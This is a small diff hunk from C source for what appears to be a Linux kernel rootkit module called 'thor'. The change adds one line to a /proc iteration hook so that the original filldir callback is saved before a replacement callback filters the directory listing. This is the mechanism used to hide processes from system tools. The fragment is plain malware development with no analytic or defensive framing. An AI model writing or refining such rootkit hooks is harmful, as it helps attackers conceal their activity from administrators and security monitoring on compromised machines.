@@ -87,6 +87,7 @@ void prochider_cleanup(void)
 #if LINUX_VERSION_CODE < KERNEL_VERSION(3, 10, 0)
 static int thor_proc_iterate(struct file *file, void *dirent, filldir_t filldir)
 {
+    orig_proc_filldir = filldir;
     return orig_proc_iterate(file, dirent, thor_proc_filldir);
 }
 #else
